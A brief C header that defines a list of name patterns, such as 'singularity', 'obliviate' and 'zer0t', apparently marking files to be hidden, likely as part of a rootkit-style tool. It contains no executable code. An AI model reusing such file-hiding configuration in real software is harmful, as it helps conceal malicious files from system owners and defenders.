#ifndef HIDING_FILES_DEF_H
#define HIDING_FILES_DEF_H

static const char *hidden_patterns[] = {
    "jira",
    "singularity",
    "obliviate",
    "matheuz",
    "zer0t",
    "dhcpcnf",
    NULL  
};

#endif
